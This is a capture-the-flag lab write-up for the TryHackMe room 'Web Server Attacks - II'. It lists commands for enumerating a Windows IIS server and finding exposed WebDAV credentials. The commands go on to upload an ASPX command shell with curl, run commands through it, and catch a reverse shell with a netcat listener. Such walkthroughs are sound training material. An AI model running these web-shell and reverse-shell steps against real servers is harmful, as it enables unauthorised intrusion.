 # TryHackMe – Web Server Attacks - II

## Room Information

- **Room Name:** Web Server Attacks - II
- **Platform:** TryHackMe
- **Difficulty:** Easy
- **Category:** Web / Enumeration / Exploitation
- **Target:** Windows IIS Web Server

---

## Objective

The objective of this room was to learn how to enumerate and attack a Microsoft IIS web server, identify WebDAV functionality, discover exposed files and credentials, exploit WebDAV file upload capabilities, achieve remote command execution, and obtain a reverse shell.

---

## Tools Used

- Nmap
- Curl
- IIS ShortName Scanner
- Netcat
- PowerShell
- WebDAV

---

## Commands Used

### Scan the HTTP Service

```bash
nmap -sV -p 80 MACHINE_IP
```

Used Nmap to scan TCP port 80 and identify the HTTP service running on the target.

### Check HTTP Headers

```bash
curl -I http://MACHINE_IP
```

This revealed information about the web server, including:

```text
Microsoft-IIS/10.0
ASP.NET
```

### Enumerate HTTP Methods

```bash
nmap --script http-methods -p 80 MACHINE_IP
```

This showed that the server supported several HTTP and WebDAV methods, including:

```text
GET
POST
HEAD
PUT
DELETE
COPY
MOVE
PROPFIND
LOCK
UNLOCK
```

### Detect WebDAV

```bash
nmap --script http-webdav-scan -p 80 MACHINE_IP
```

Used to identify WebDAV functionality on the IIS server.

I also used an `OPTIONS` request to check the HTTP methods supported by the server.

```bash
curl -X OPTIONS http://MACHINE_IP -sv 2>&1 | grep -E "Allow:|DAV:"
```

### IIS Short Name Enumeration

```bash
python3 iis_shortname_scan.py http://MACHINE_IP/
```

Used IIS short-name enumeration to help identify hidden or interesting files and directories on the IIS server.

### Enumerate the Backup Directory

```bash
curl http://MACHINE_IP/BackupFiles/
```

Directory listing exposed a file named:

```text
webdav_notes.txt
```

### Read the WebDAV Notes

```bash
curl http://MACHINE_IP/BackupFiles/webdav_notes.txt
```

The file revealed information about the WebDAV directory and credentials.

### Enumerate the Upload Directory

```bash
curl http://MACHINE_IP/uploads/
```

This exposed additional files, including:

```text
config.bak
web.config
```

### Upload ASPX File Through WebDAV

```bash
curl -v --ntlm -u 'USERNAME:PASSWORD' -T cmd.aspx http://MACHINE_IP/webdav/cmd.aspx
```

The WebDAV `PUT` functionality allowed an ASPX command shell to be uploaded to the server.

### Test Remote Command Execution

```bash
curl "http://MACHINE_IP/webdav/cmd.aspx?cmd=whoami"
```

The `whoami` command successfully executed on the Windows target, confirming remote command execution.

### Start Netcat Listener

```bash
nc -lvnp 443
```

Used Netcat to listen for the incoming reverse-shell connection.

### Enumerate Windows Privileges

```cmd
whoami /priv
```

Used after obtaining the shell to identify the privileges assigned to the compromised Windows account.

